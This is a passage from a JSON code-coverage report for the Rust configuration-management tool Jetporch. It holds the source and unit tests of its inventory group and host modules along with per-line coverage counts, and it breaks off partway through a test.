serde_yaml::to_string(\u0026self.get_variables());\n        return match result {\n            Ok(x) =\u003e Ok(x),\n            Err(_y) =\u003e Err(String::from(\"error loading variables\"))\n        }\n    }\n\n    pub fn get_blended_variables_yaml(\u0026self) -\u003e Result\u003cString,String\u003e {\n        let result = serde_yaml::to_string(\u0026self.get_blended_variables());\n        return match result {\n            Ok(x) =\u003e Ok(x),\n            Err(_y) =\u003e Err(String::from(\"error loading blended variables\"))\n        }\n    }\n\n\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    fn create_test_host(name: \u0026str) -\u003e Arc\u003cRwLock\u003cHost\u003e\u003e {\n        Arc::new(RwLock::new(Host::new(\u0026name.to_string())))\n    }\n\n    fn create_test_group(name: \u0026str) -\u003e Arc\u003cRwLock\u003cGroup\u003e\u003e {\n        Arc::new(RwLock::new(Group::new(\u0026name.to_string())))\n    }\n\n    #[test]\n    fn test_group_new() {\n        let group = Group::new(\u0026\"test-group\".to_string());\n        assert_eq!(group.name, \"test-group\");\n        assert!(group.subgroups.is_empty());\n        assert!(group.parents.is_empty());\n        assert!(group.hosts.is_empty());\n        assert!(group.variables.is_empty());\n    }\n\n    #[test]\n    fn test_add_subgroup() {\n        let mut group = Group::new(\u0026\"parent\".to_string());\n        let subgroup = create_test_group(\"child\");\n        \n        group.add_subgroup(\u0026\"child\".to_string(), subgroup.clone());\n        \n        assert_eq!(group.subgroups.len(), 1);\n        assert!(group.subgroups.contains_key(\"child\"));\n    }\n\n    #[test]\n    #[should_panic]\n    fn test_add_subgroup_self_reference() {\n        let mut group = Group::new(\u0026\"test\".to_string());\n        let self_ref = create_test_group(\"test\");\n        \n        // Should panic - can't add self as subgroup\n        group.add_subgroup(\u0026\"test\".to_string(), self_ref);\n    }\n\n    #[test]\n    fn test_add_host() {\n        let mut group = Group::new(\u0026\"web\".to_string());\n        let host = create_test_host(\"webserver1\");\n        \n        group.add_host(\u0026\"webserver1\".to_string(), host.clone());\n        \n        assert_eq!(group.hosts.len(), 1);\n        assert!(group.hosts.contains_key(\"webserver1\"));\n    }\n\n    #[test]\n    fn test_add_parent() {\n        let mut group = Group::new(\u0026\"child\".to_string());\n        let parent = create_test_group(\"parent\");\n        \n        group.add_parent(\u0026\"parent\".to_string(), parent.clone());\n        \n        assert_eq!(group.parents.len(), 1);\n        assert!(group.parents.contains_key(\"parent\"));\n    }\n\n    #[test]\n    #[should_panic]\n    fn test_add_parent_self_reference() {\n        let mut group = Group::new(\u0026\"test\".to_string());\n        let self_ref = create_test_group(\"test\");\n        \n        // Should panic - can't add self as parent\n        group.add_parent(\u0026\"test\".to_string(), self_ref);\n    }\n\n    #[test]\n    fn test_get_ancestor_groups() {\n        let mut child = Group::new(\u0026\"child\".to_string());\n        let parent = create_test_group(\"parent\");\n        let grandparent = create_test_group(\"grandparent\");\n        \n        // Set up hierarchy\n        child.add_parent(\u0026\"parent\".to_string(), parent.clone());\n        parent.write().unwrap().add_parent(\u0026\"grandparent\".to_string(), grandparent.clone());\n        \n        let ancestors = child.get_ancestor_groups(10);\n        assert!(ancestors.contains_key(\"parent\"));\n        assert!(ancestors.contains_key(\"grandparent\"));\n        \n        // Test depth limit - depth 0 means only direct parents\n        let limited = child.get_ancestor_groups(0);\n        assert!(limited.contains_key(\"parent\"));\n        assert!(!limited.contains_key(\"grandparent\"));\n    }\n\n    #[test]\n    fn test_get_ancestor_group_names() {\n        let mut child = Group::new(\u0026\"child\".to_string());\n        let parent = create_test_group(\"parent\");\n        \n        child.add_parent(\u0026\"parent\".to_string(), parent);\n        \n        let names = child.get_ancestor_group_names();\n        assert!(names.contains(\u0026\"parent\".to_string()));\n    }\n\n    #[test]\n    fn test_get_descendant_groups() {\n        let mut parent = Group::new(\u0026\"parent\".to_string());\n        let child = create_test_group(\"child\");\n        let grandchild = create_test_group(\"grandchild\");\n        \n        // Set up hierarchy\n        parent.add_subgroup(\u0026\"child\".to_string(), child.clone());\n        child.write().unwrap().add_subgroup(\u0026\"grandchild\".to_string(), grandchild.clone());\n        \n        let descendants = parent.get_descendant_groups(10);\n        assert!(descendants.contains_key(\"child\"));\n        assert!(descendants.contains_key(\"grandchild\"));\n        \n        // Test depth limit - depth 0 means only direct children\n        let limited = parent.get_descendant_groups(0);\n        assert!(limited.contains_key(\"child\"));\n        assert!(!limited.contains_key(\"grandchild\"));\n    }\n\n    #[test]\n    fn test_get_descendant_group_names() {\n        let mut parent = Group::new(\u0026\"parent\".to_string());\n        let child = create_test_group(\"child\");\n        \n        parent.add_subgroup(\u0026\"child\".to_string(), child);\n        \n        let names = parent.get_descendant_group_names();\n        assert!(names.contains(\u0026\"child\".to_string()));\n    }\n\n    #[test]\n    fn test_get_parent_groups_and_names() {\n        let mut child = Group::new(\u0026\"child\".to_string());\n        let parent1 = create_test_group(\"parent1\");\n        let parent2 = create_test_group(\"parent2\");\n        \n        child.add_parent(\u0026\"parent1\".to_string(), parent1);\n        child.add_parent(\u0026\"parent2\".to_string(), parent2);\n        \n        let parents = child.get_parent_groups();\n        assert_eq!(parents.len(), 2);\n        assert!(parents.contains_key(\"parent1\"));\n        assert!(parents.contains_key(\"parent2\"));\n        \n        let names = child.get_parent_group_names();\n        assert_eq!(names.len(), 2);\n        assert!(names.contains(\u0026\"parent1\".to_string()));\n        assert!(names.contains(\u0026\"parent2\".to_string()));\n    }\n\n    #[test]\n    fn test_get_subgroups_and_names() {\n        let mut parent = Group::new(\u0026\"parent\".to_string());\n        let child1 = create_test_group(\"child1\");\n        let child2 = create_test_group(\"child2\");\n        \n        parent.add_subgroup(\u0026\"child1\".to_string(), child1);\n        parent.add_subgroup(\u0026\"child2\".to_string(), child2);\n        \n        let subgroups = parent.get_subgroups();\n        assert_eq!(subgroups.len(), 2);\n        assert!(subgroups.contains_key(\"child1\"));\n        assert!(subgroups.contains_key(\"child2\"));\n        \n        let names = parent.get_subgroup_names();\n        assert_eq!(names.len(), 2);\n        assert!(names.contains(\u0026\"child1\".to_string()));\n        assert!(names.contains(\u0026\"child2\".to_string()));\n    }\n\n    #[test]\n    fn test_get_direct_hosts_and_names() {\n        let mut group = Group::new(\u0026\"web\".to_string());\n        let host1 = create_test_host(\"web1\");\n        let host2 = create_test_host(\"web2\");\n        \n        group.add_host(\u0026\"web1\".to_string(), host1);\n        group.add_host(\u0026\"web2\".to_string(), host2);\n        \n        let hosts = group.get_direct_hosts();\n        assert_eq!(hosts.len(), 2);\n        assert!(hosts.contains_key(\"web1\"));\n        assert!(hosts.contains_key(\"web2\"));\n        \n        let names = group.get_direct_host_names();\n        assert_eq!(names.len(), 2);\n        assert!(names.contains(\u0026\"web1\".to_string()));\n        assert!(names.contains(\u0026\"web2\".to_string()));\n    }\n\n    #[test]\n    fn test_get_descendant_hosts() {\n        let mut parent = Group::new(\u0026\"parent\".to_string());\n        let child = create_test_group(\"child\");\n        let host1 = create_test_host(\"host1\");\n        let host2 = create_test_host(\"host2\");\n        \n        // Add host to parent\n        parent.add_host(\u0026\"host1\".to_string(), host1);\n        \n        // Add host to child\n        child.write().unwrap().add_host(\u0026\"host2\".to_string(), host2);\n        \n        // Add child to parent\n        parent.add_subgroup(\u0026\"child\".to_string(), child);\n        \n        let descendants = parent.get_descendant_hosts();\n        assert_eq!(descendants.len(), 2);\n        assert!(descendants.contains_key(\"host1\"));\n        assert!(descendants.contains_key(\"host2\"));\n        \n        let names = parent.get_descendant_host_names();\n        assert_eq!(names.len(), 2);\n        assert!(names.contains(\u0026\"host1\".to_string()));\n        assert!(names.contains(\u0026\"host2\".to_string()));\n    }\n\n    #[test]\n    fn test_variables() {\n        let mut group = Group::new(\u0026\"test\".to_string());\n        \n        // Initially empty\n        assert!(group.get_variables().is_empty());\n        \n        // Set variables\n        let mut vars = serde_yaml::Mapping::new();\n        vars.insert(\n            serde_yaml::Value::String(\"key1\".to_string()),\n            serde_yaml::Value::String(\"value1\".to_string())\n        );\n        group.set_variables(vars.clone());\n        \n        let retrieved = group.get_variables();\n        assert_eq!(retrieved[\"key1\"], \"value1\");\n    }\n\n    #[test]\n    fn test_update_variables() {\n        let mut group = Group::new(\u0026\"test\".to_string());\n        \n        // Set initial variables\n        let mut vars = serde_yaml::Mapping::new();\n        vars.insert(\n            serde_yaml::Value::String(\"key1\".to_string()),\n            serde_yaml::Value::String(\"value1\".to_string())\n        );\n        group.set_variables(vars);\n        \n        // Update with new variables\n        let mut update = serde_yaml::Mapping::new();\n        update.insert(\n            serde_yaml::Value::String(\"key2\".to_string()),\n            serde_yaml::Value::String(\"value2\".to_string())\n        );\n        update.insert(\n            serde_yaml::Value::String(\"key1\".to_string()),\n            serde_yaml::Value::String(\"updated1\".to_string())\n        );\n        group.update_variables(update);\n        \n        let vars = group.get_variables();\n        assert_eq!(vars[\"key1\"], \"updated1\");\n        assert_eq!(vars[\"key2\"], \"value2\");\n    }\n\n    #[test]\n    fn test_get_blended_variables() {\n        let mut child = Group::new(\u0026\"child\".to_string());\n        let parent = create_test_group(\"parent\");\n        let grandparent = create_test_group(\"grandparent\");\n        \n        // Set variables at each level\n        {\n            let mut gp_mut = grandparent.write().unwrap();\n            let mut gp_vars = serde_yaml::Mapping::new();\n            gp_vars.insert(\n                serde_yaml::Value::String(\"level\".to_string()),\n                serde_yaml::Value::String(\"grandparent\".to_string())\n            );\n            gp_vars.insert(\n                serde_yaml::Value::String(\"gp_only\".to_string()),\n                serde_yaml::Value::String(\"gp_value\".to_string())\n            );\n            gp_mut.set_variables(gp_vars);\n        }\n        \n        {\n            let mut p_mut = parent.write().unwrap();\n            let mut p_vars = serde_yaml::Mapping::new();\n            p_vars.insert(\n                serde_yaml::Value::String(\"level\".to_string()),\n                serde_yaml::Value::String(\"parent\".to_string())\n            );\n            p_vars.insert(\n                serde_yaml::Value::String(\"p_only\".to_string()),\n                serde_yaml::Value::String(\"p_value\".to_string())\n            );\n            p_mut.set_variables(p_vars);\n            p_mut.add_parent(\u0026\"grandparent\".to_string(), grandparent);\n        }\n        \n        let mut c_vars = serde_yaml::Mapping::new();\n        c_vars.insert(\n            serde_yaml::Value::String(\"level\".to_string()),\n            serde_yaml::Value::String(\"child\".to_string())\n        );\n        c_vars.insert(\n            serde_yaml::Value::String(\"c_only\".to_string()),\n            serde_yaml::Value::String(\"c_value\".to_string())\n        );\n        child.set_variables(c_vars);\n        child.add_parent(\u0026\"parent\".to_string(), parent);\n        \n        // Test blending - child overrides parent overrides grandparent\n        let blended = child.get_blended_variables();\n        assert_eq!(blended[\"level\"], \"child\");\n        assert_eq!(blended[\"gp_only\"], \"gp_value\");\n        assert_eq!(blended[\"p_only\"], \"p_value\");\n        assert_eq!(blended[\"c_only\"], \"c_value\");\n    }\n\n    #[test]\n    fn test_get_variables_yaml() {\n        let mut group = Group::new(\u0026\"test\".to_string());\n        \n        let mut vars = serde_yaml::Mapping::new();\n        vars.insert(\n            serde_yaml::Value::String(\"key\".to_string()),\n            serde_yaml::Value::String(\"value\".to_string())\n        );\n        group.set_variables(vars);\n        \n        let yaml = group.get_variables_yaml().unwrap();\n        assert!(yaml.contains(\"key: value\"));\n    }\n\n    #[test]\n    fn test_get_blended_variables_yaml() {\n        let mut group = Group::new(\u0026\"test\".to_string());\n        \n        let mut vars = serde_yaml::Mapping::new();\n        vars.insert(\n            serde_yaml::Value::String(\"group_var\".to_string()),\n            serde_yaml::Value::String(\"group_value\".to_string())\n        );\n        group.set_variables(vars);\n        \n        let yaml = group.get_blended_variables_yaml().unwrap();\n        assert!(yaml.contains(\"group_var: group_value\"));\n    }\n}\n\n\n\n\n","traces":[{"line":34,"address":[],"length":0,"stats":{"Line":86}},{"line":36,"address":[],"length":0,"stats":{"Line":86}},{"line":37,"address":[],"length":0,"stats":{"Line":86}},{"line":38,"address":[],"length":0,"stats":{"Line":86}},{"line":39,"address":[],"length":0,"stats":{"Line":86}},{"line":40,"address":[],"length":0,"stats":{"Line":86}},{"line":44,"address":[],"length":0,"stats":{"Line":16}},{"line":45,"address":[],"length":0,"stats":{"Line":16}},{"line":46,"address":[],"length":0,"stats":{"Line":14}},{"line":47,"address":[],"length":0,"stats":{"Line":14}},{"line":48,"address":[],"length":0,"stats":{"Line":14}},{"line":52,"address":[],"length":0,"stats":{"Line":10}},{"line":53,"address":[],"length":0,"stats":{"Line":10}},{"line":54,"address":[],"length":0,"stats":{"Line":10}},{"line":55,"address":[],"length":0,"stats":{"Line":10}},{"line":59,"address":[],"length":0,"stats":{"Line":18}},{"line":60,"address":[],"length":0,"stats":{"Line":18}},{"line":61,"address":[],"length":0,"stats":{"Line":16}},{"line":62,"address":[],"length":0,"stats":{"Line":16}},{"line":63,"address":[],"length":0,"stats":{"Line":16}},{"line":67,"address":[],"length":0,"stats":{"Line":32}},{"line":68,"address":[],"length":0,"stats":{"Line":32}},{"line":69,"address":[],"length":0,"stats":{"Line":44}},{"line":70,"address":[],"length":0,"stats":{"Line":12}},{"line":71,"address":[],"length":0,"stats":{"Line":12}},{"line":72,"address":[],"length":0,"stats":{"Line":18}},{"line":73,"address":[],"length":0,"stats":{"Line":4}},{"line":77,"address":[],"length":0,"stats":{"Line":32}},{"line":80,"address":[],"length":0,"stats":{"Line":2}},{"line":81,"address":[],"length":0,"stats":{"Line":6}},{"line":84,"address":[],"length":0,"stats":{"Line":20}},{"line":86,"address":[],"length":0,"stats":{"Line":20}},{"line":87,"address":[],"length":0,"stats":{"Line":32}},{"line":88,"address":[],"length":0,"stats":{"Line":12}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":12}},{"line":92,"address":[],"length":0,"stats":{"Line":14}},{"line":93,"address":[],"length":0,"stats":{"Line":2}},{"line":94,"address":[],"length":0,"stats":{"Line":2}},{"line":95,"address":[],"length":0,"stats":{"Line":2}},{"line":99,"address":[],"length":0,"stats":{"Line":12}},{"line":100,"address":[],"length":0,"stats":{"Line":12}},{"line":101,"address":[],"length":0,"stats":{"Line":12}},{"line":104,"address":[],"length":0,"stats":{"Line":20}},{"line":107,"address":[],"length":0,"stats":{"Line":2}},{"line":108,"address":[],"length":0,"stats":{"Line":6}},{"line":111,"address":[],"length":0,"stats":{"Line":4}},{"line":112,"address":[],"length":0,"stats":{"Line":4}},{"line":113,"address":[],"length":0,"stats":{"Line":20}},{"line":114,"address":[],"length":0,"stats":{"Line":8}},{"line":115,"address":[],"length":0,"stats":{"Line":8}},{"line":116,"address":[],"length":0,"stats":{"Line":8}},{"line":119,"address":[],"length":0,"stats":{"Line":4}},{"line":122,"address":[],"length":0,"stats":{"Line":2}},{"line":123,"address":[],"length":0,"stats":{"Line":8}},{"line":126,"address":[],"length":0,"stats":{"Line":4}},{"line":127,"address":[],"length":0,"stats":{"Line":4}},{"line":128,"address":[],"length":0,"stats":{"Line":20}},{"line":129,"address":[],"length":0,"stats":{"Line":8}},{"line":130,"address":[],"length":0,"stats":{"Line":8}},{"line":131,"address":[],"length":0,"stats":{"Line":8}},{"line":134,"address":[],"length":0,"stats":{"Line":4}},{"line":137,"address":[],"length":0,"stats":{"Line":2}},{"line":138,"address":[],"length":0,"stats":{"Line":8}},{"line":141,"address":[],"length":0,"stats":{"Line":12}},{"line":142,"address":[],"length":0,"stats":{"Line":12}},{"line":143,"address":[],"length":0,"stats":{"Line":44}},{"line":144,"address":[],"length":0,"stats":{"Line":16}},{"line":145,"address":[],"length":0,"stats":{"Line":16}},{"line":146,"address":[],"length":0,"stats":{"Line":16}},{"line":149,"address":[],"length":0,"stats":{"Line":12}},{"line":152,"address":[],"length":0,"stats":{"Line":2}},{"line":153,"address":[],"length":0,"stats":{"Line":8}},{"line":156,"address":[],"length":0,"stats":{"Line":4}},{"line":157,"address":[],"length":0,"stats":{"Line":4}},{"line":158,"address":[],"length":0,"stats":{"Line":4}},{"line":159,"address":[],"length":0,"stats":{"Line":16}},{"line":160,"address":[],"length":0,"stats":{"Line":4}},{"line":161,"address":[],"length":0,"stats":{"Line":8}},{"line":162,"address":[],"length":0,"stats":{"Line":4}},{"line":163,"address":[],"length":0,"stats":{"Line":12}},{"line":165,"address":[],"length":0,"stats":{"Line":4}},{"line":168,"address":[],"length":0,"stats":{"Line":2}},{"line":169,"address":[],"length":0,"stats":{"Line":8}},{"line":172,"address":[],"length":0,"stats":{"Line":18}},{"line":173,"address":[],"length":0,"stats":{"Line":18}},{"line":176,"address":[],"length":0,"stats":{"Line":16}},{"line":177,"address":[],"length":0,"stats":{"Line":16}},{"line":180,"address":[],"length":0,"stats":{"Line":2}},{"line":181,"address":[],"length":0,"stats":{"Line":10}},{"line":182,"address":[],"length":0,"stats":{"Line":4}},{"line":186,"address":[],"length":0,"stats":{"Line":4}},{"line":187,"address":[],"length":0,"stats":{"Line":4}},{"line":188,"address":[],"length":0,"stats":{"Line":4}},{"line":189,"address":[],"length":0,"stats":{"Line":12}},{"line":190,"address":[],"length":0,"stats":{"Line":4}},{"line":191,"address":[],"length":0,"stats":{"Line":4}},{"line":193,"address":[],"length":0,"stats":{"Line":4}},{"line":194,"address":[],"length":0,"stats":{"Line":4}},{"line":195,"address":[],"length":0,"stats":{"Line":4}},{"line":196,"address":[],"length":0,"stats":{"Line":4}},{"line":197,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":2}},{"line":202,"address":[],"length":0,"stats":{"Line":2}},{"line":203,"address":[],"length":0,"stats":{"Line":2}},{"line":204,"address":[],"length":0,"stats":{"Line":2}},{"line":205,"address":[],"length":0,"stats":{"Line":0}},{"line":209,"address":[],"length":0,"stats":{"Line":2}},{"line":210,"address":[],"length":0,"stats":{"Line":2}},{"line":211,"address":[],"length":0,"stats":{"Line":2}},{"line":212,"address":[],"length":0,"stats":{"Line":2}},{"line":213,"address":[],"length":0,"stats":{"Line":0}}],"covered":108,"coverable":112},{"path":["/","Users","wings","projects","jetpack","src","inventory","hosts.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::collections::HashMap;\nuse crate::util::yaml::blend_variables;\nuse std::sync::Arc;\nuse crate::inventory::groups::Group;\nuse std::sync::RwLock;\nuse std::collections::HashSet;\nuse serde_yaml;\n\n#[derive(Clone,Copy,Debug,PartialEq)]\npub enum HostOSType {\n    Linux,\n    MacOS,\n}\n\n#[derive(Clone,Copy,Debug)]\npub enum PackagePreference {\n    // other package systems are supported but no other OSes are 'fuzzy' between distro families (yet)\n    // so we don't need to specify them here (yet)\n    Dnf,\n    Yum,\n}\n\npub struct Host {\n    pub name               : String,\n    pub groups             : HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e,\n    pub variables          : serde_yaml::Mapping,\n    pub os_type            : Option\u003cHostOSType\u003e,\n    checksum_cache         : HashMap\u003cString,String\u003e,\n    checksum_cache_task_id : usize,\n    facts                  : serde_yaml::Value,\n    pub package_preference : Option\u003cPackagePreference\u003e,\n    notified_handlers      : HashMap\u003cusize, HashSet\u003cString\u003e\u003e\n}\n\nimpl Host {\n\n    pub fn new(name: \u0026String) -\u003e Self {\n        Self {\n            name: name.clone(),\n            variables : serde_yaml::Mapping::new(),\n            groups: HashMap::new(),\n            os_type: None,\n            checksum_cache: HashMap::new(),\n            checksum_cache_task_id: 0,\n            facts: serde_yaml::Value::from(serde_yaml::Mapping::new()),\n            notified_handlers: HashMap::new(),\n            package_preference: None\n        }\n    }\n\n    pub fn notify(\u0026mut self, play_number: usize, signal: \u0026String) {\n        if ! self.notified_handlers.contains_key(\u0026play_number) {\n            self.notified_handlers.insert(play_number, HashSet::new());\n        }\n        let entry = self.notified_handlers.get_mut(\u0026play_number).unwrap();\n        entry.insert(signal.clone());\n    }\n\n    pub fn is_notified(\u0026self, play_number: usize, signal: \u0026String) -\u003e bool {\n        let entry = self.notified_handlers.get(\u0026play_number);\n        if entry.is_none() {\n            return false;\n        } else {\n            return entry.unwrap().contains(\u0026signal.clone());\n        }\n    }\n\n    pub fn set_checksum_cache(\u0026mut self, path: \u0026String, checksum: \u0026String) {\n        self.checksum_cache.insert(path.clone(), checksum.clone());\n    }\n\n    pub fn get_checksum_cache(\u0026mut self, task_id: usize, path: \u0026String) -\u003e Option\u003cString\u003e {\n        if task_id \u003e self.checksum_cache_task_id {\n            self.checksum_cache_task_id = task_id;\n            self.checksum_cache.clear();\n        }\n        if self.checksum_cache.contains_key(path) {\n            let result = self.checksum_cache.get(path).unwrap();\n            return Some(result.clone());\n        }\n        else {\n            return None;\n        }\n    }\n\n    // used by connection class on initial connect\n    pub fn set_os_info(\u0026mut self, uname_output: \u0026String) -\u003e Result\u003c(),String\u003e {\n        if uname_output.starts_with(\"Linux\")   { self.os_type = Some(HostOSType::Linux)   }\n        else if uname_output.starts_with(\"Darwin\")  { self.os_type = Some(HostOSType::MacOS)   }\n        else {\n            return Err(format!(\"OS Type could not be detected from uname -a: {}\", uname_output));\n        }\n        return Ok(());\n    }\n\n    // ==============================================================================================================\n    // PUBLIC API - most code can use this\n    // ==============================================================================================================\n  \n    pub fn get_groups(\u0026self) -\u003e HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e {\n        let mut results : HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e = HashMap::new();\n        for (k,v) in self.groups.iter() {\n            results.insert(k.clone(), Arc::clone(\u0026v));\n        }\n        return results;\n    }\n\n    pub fn has_group(\u0026self, group_name: \u0026String) -\u003e bool {\n        for (k,_v) in self.groups.iter() {\n            if k == group_name {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    // get_ancestor_groups(\u0026self, depth_limit: usize) -\u003e HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e\n\n    pub fn has_ancestor_group(\u0026self, group_name: \u0026String) -\u003e bool {\n        for (k,v) in self.groups.iter() {\n            if k == group_name {\n                return true;\n            }\n            for (k2,_v2) in v.read().unwrap().get_ancestor_groups(10) {\n                if k2 == group_name.clone() {\n                    return true;\n                }\n            }\n        }\n        return false;\n    }\n\n    pub fn get_group_names(\u0026self) -\u003e Vec\u003cString\u003e {\n        return self.get_groups().iter().map(|(k,_v)| k.clone()).collect();\n    }\n\n    pub fn add_group(\u0026mut self, name: \u0026String, group: Arc\u003cRwLock\u003cGroup\u003e\u003e) {\n        self.groups.insert(name.clone(), Arc::clone(\u0026group));\n    }\n\n    pub fn get_ancestor_groups(\u0026self, depth_limit: usize) -\u003e HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e {\n\n        let mut results : HashMap\u003cString, Arc\u003cRwLock\u003cGroup\u003e\u003e\u003e = HashMap::new();\n        for (k,v) in self.get_groups().into_iter() {\n            results.insert(k, Arc::clone(\u0026v));\n            for (k2,v2) in v.read().expect(\"group read\").get_ancestor_groups(depth_limit).into_iter() { \n                results.insert(k2, Arc::clone(\u0026v2)); \n            }\n        }\n        return results;\n    }\n\n    pub fn get_ancestor_group_names(\u0026self) -\u003e Vec\u003cString\u003e {\n        return self.get_ancestor_groups(20usize).iter().map(|(k,_v)| k.clone()).collect();\n    }\n\n    pub fn get_variables(\u0026self) -\u003e serde_yaml::Mapping {\n        return self.variables.clone();\n    }\n\n    pub fn set_variables(\u0026mut self, variables: serde_yaml::Mapping) {\n        self.variables = variables.clone();\n    }\n\n    pub fn update_variables(\u0026mut self, mapping: serde_yaml::Mapping) {\n        for (k,v) in mapping.iter() {\n            self.variables.insert(k.clone(),v.clone());\n        }\n    }\n\n    pub fn get_blended_variables(\u0026self) -\u003e serde_yaml::Mapping {\n        let mut blended : serde_yaml::Value = serde_yaml::Value::from(serde_yaml::Mapping::new());\n        let ancestors = self.get_ancestor_groups(20);\n        for (_k,v) in ancestors.iter() {\n            let theirs : serde_yaml::Value = serde_yaml::Value::from(v.read().unwrap().get_variables());\n            blend_variables(\u0026mut blended, theirs);\n        }\n        let mine = serde_yaml::Value::from(self.get_variables());\n        blend_variables(\u0026mut blended, mine);\n        blend_variables(\u0026mut blended, self.facts.clone());\n        return match blended {\n            serde_yaml::Value::Mapping(x) =\u003e x,\n            _ =\u003e panic!(\"get_blended_variables produced a non-mapping (1)\")\n        }\n    }\n\n    pub fn update_facts(\u0026mut self, mapping: \u0026Arc\u003cRwLock\u003cserde_yaml::Mapping\u003e\u003e) {\n        let map = mapping.read().unwrap().clone();\n        blend_variables(\u0026mut self.facts, serde_yaml::Value::Mapping(map));\n    }\n\n    pub fn update_facts2(\u0026mut self, mapping: serde_yaml::Mapping) {\n        blend_variables(\u0026mut self.facts, serde_yaml::Value::Mapping(mapping));\n    }\n\n    pub fn get_variables_yaml(\u0026self) -\u003e Result\u003cString, String\u003e {\n        let result = serde_yaml::to_string(\u0026self.get_variables());\n        return match result {\n            Ok(x) =\u003e Ok(x),\n            Err(_y) =\u003e Err(String::from(\"error loading variables\"))\n        }\n    }\n\n    pub fn get_blended_variables_yaml(\u0026self) -\u003e Result\u003cString,String\u003e {\n        let result = serde_yaml::to_string(\u0026self.get_blended_variables());\n        return match result {\n            Ok(x) =\u003e Ok(x),\n            Err(_y) =\u003e Err(String::from(\"error loading blended variables\"))\n        }\n    }\n\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    fn create_test_group(name: \u0026str) -\u003e Arc\u003cRwLock\u003cGroup\u003e\u003e {\n        Arc::new(RwLock::new(Group::new(\u0026name.to_string())))\n    }\n\n    #[test]\n    fn test_host_new() {\n        let host = Host::new(\u0026\"test-host\".to_string());\n        assert_eq!(host.name, \"test-host\");\n        assert!(host.groups.is_empty());\n        assert!(host.variables.is_empty());\n        assert!(host.os_type.is_none());\n        assert!(host.package_preference.is_none());\n    }\n\n    #[test]\n    fn test_set_os_info_linux() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        let result = host.set_os_info(\u0026\"Linux 5.15.0-58-generic\".to_string());\n        assert!(result.is_ok());\n        assert_eq!(host.os_type, Some(HostOSType::Linux));\n    }\n\n    #[test]\n    fn test_set_os_info_macos() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        let result = host.set_os_info(\u0026\"Darwin 21.6.0\".to_string());\n        assert!(result.is_ok());\n        assert_eq!(host.os_type, Some(HostOSType::MacOS));\n    }\n\n    #[test]\n    fn test_set_os_info_unknown() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        let result = host.set_os_info(\u0026\"UnknownOS 1.0\".to_string());\n        assert!(result.is_err());\n        assert!(result.unwrap_err().contains(\"OS Type could not be detected\"));\n    }\n\n    #[test]\n    fn test_notify_and_is_notified() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        \n        // Initially not notified\n        assert!(!host.is_notified(1, \u0026\"handler1\".to_string()));\n        \n        // Notify handler\n        host.notify(1, \u0026\"handler1\".to_string());\n        assert!(host.is_notified(1, \u0026\"handler1\".to_string()));\n        \n        // Different play number\n        assert!(!host.is_notified(2, \u0026\"handler1\".to_string()));\n        \n        // Multiple handlers in same play\n        host.notify(1, \u0026\"handler2\".to_string());\n        assert!(host.is_notified(1, \u0026\"handler1\".to_string()));\n        assert!(host.is_notified(1, \u0026\"handler2\".to_string()));\n    }\n\n    #[test]\n    fn test_checksum_cache() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        \n        // Initially empty\n        assert!(host.get_checksum_cache(1, \u0026\"/path/file\".to_string()).is_none());\n        \n        // Set checksum\n        host.set_checksum_cache(\u0026\"/path/file\".to_string(), \u0026\"abc123\".to_string());\n        assert_eq!(host.get_checksum_cache(1, \u0026\"/path/file\".to_string()), Some(\"abc123\".to_string()));\n        \n        // Different task ID clears cache\n        assert!(host.get_checksum_cache(2, \u0026\"/path/file\".to_string()).is_none());\n        \n        // Set and get multiple checksums\n        host.set_checksum_cache(\u0026\"/path/file1\".to_string(), \u0026\"checksum1\".to_string());\n        host.set_checksum_cache(\u0026\"/path/file2\".to_string(), \u0026\"checksum2\".to_string());\n        assert_eq!(host.get_checksum_cache(2, \u0026\"/path/file1\".to_string()), Some(\"checksum1\".to_string()));\n        assert_eq!(host.get_checksum_cache(2, \u0026\"/path/file2\".to_string()), Some(\"checksum2\".to_string()));\n    }\n\n    #[test]\n    fn test_add_group_and_has_group() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        let group = create_test_group(\"web\");\n        \n        assert!(!host.has_group(\u0026\"web\".to_string()));\n        \n        host.add_group(\u0026\"web\".to_string(), group);\n        assert!(host.has_group(\u0026\"web\".to_string()));\n        assert!(!host.has_group(\u0026\"db\".to_string()));\n    }\n\n    #[test]\n    fn test_get_groups_and_group_names() {\n        let mut host = Host::new(\u0026\"test-host\".to_string());\n        let group1 = create_test_group(\"web\");\n        let group2 = create_test_group(\"prod\");\n        \n        host.add_group(\u0026\"web\".to_string(), group1);\n        host.add_group(\u0026\"prod\".to_string(), group2);\n        \n        let groups = host.get_groups();\n        assert_eq!(groups.len(), 2);\n        assert!(groups.contains_key(\"web\"));\n        assert!(groups.contains_key(\"prod\"));\n        \n        let names = host.get_group_names();\n        assert_eq!(names.len(), 2);\n        assert!(names.contains(\u0026\"web\".to_string()));\n        assert!(names.contains(\u0026\"prod\".to_string()));\n    }\n\n    #[test]\n    fn test_has_ancestor_group() {\n        let mut host = 